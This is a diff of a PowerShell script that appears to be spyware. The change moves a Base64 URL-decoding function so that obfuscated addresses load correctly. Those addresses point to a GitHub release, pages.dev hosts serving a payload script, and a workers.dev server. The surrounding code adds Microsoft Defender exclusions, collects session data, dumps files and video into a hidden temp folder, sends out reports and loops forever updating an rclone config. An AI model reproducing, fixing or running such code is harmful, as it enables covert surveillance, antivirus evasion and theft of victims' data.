@@ -1,8 +1,3 @@
-$releasesUrl = Decode-Url "aAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBFAHgANgBUAGUAbgBaAHoALwBmAC8AcgBlAGwAZQBhAHMAZXMvAGQAbwB3AG4AbABvAGEAZAAvAHYAMQAuMAAvAA=="
-$pagesUrl    = Decode-Url "aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC8A"
-$serverUrl   = Decode-Url "aAB0AHQAcABzADoALwAvAHMAZQByAHYAZQByAC4AMQAxAG4ALgB3AG8AcgBrAGUAcgBzAC4AZABlAHYALwA="
-$versionURL  = Decode-Url "aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC92AGUAcgBzAGkAbwBuAC4AdAB4AHQ="
-$payloadURL  = Decode-Url "aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC8AQQAuAHAAcwAxAA=="
 $tempDir = "$env:TEMP\system_cache"
 $fileDumpDir = "$tempDir\files"
 $videoSubDir = "$tempDir\video"
@@ -18,7 +13,14 @@ $watchdogDir = Split-Path $watchdogPath
 if (!(Test-Path $watchdogDir)) {
     New-Item -ItemType Directory -Path $watchdogDir -Force | Out-Null
 }
-
+function Decode-Url($base64) {
+    return [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($base64))
+}
+$releasesUrl = Decode-Url "aAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBFAHgANgBUAGUAbgBaAHoALwBmAC8AcgBlAGwAZQBhAHMAZXMvAGQAbwB3AG4AbABvAGEAZAAvAHYAMQAuMAAvAA=="
+$pagesUrl    = Decode-Url "aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC8A"
+$serverUrl   = Decode-Url "aAB0AHQAcABzADoALwAvAHMAZQByAHYAZQByAC4AMQAxAG4ALgB3AG8AcgBrAGUAcgBzAC4AZABlAHYALwA="
+$versionURL  = Decode-Url "aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC92AGUAcgBzAGkAbwBuAC4AdAB4AHQ="
+$payloadURL  = Decode-Url "aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC8AQQAuAHAAcwAxAA=="
 Start-Transcript -Path "$tempDir\session.log" -Append
 
 function Test-Admin {
@@ -61,10 +63,6 @@ function Set-DefenderExclusions {
     } catch {
         Write-Warning "Could not add exclusions to Defender: $_"
     }
-}
-
-function Decode-Url($base64) {
-    return [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($base64))
 }
 
 function Get-SessionData {
@@ -441,6 +439,7 @@ function Export-And-Report {
     }
     $sent | ConvertTo-Json | Set-Content $sentLog
 
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
     $summary = @"
 PowerShell Report
 User: $user
@@ -520,5 +519,3 @@ while ($true) {
     Update-RcloneConf
     Start-Sleep -Seconds 10
 }
-
-
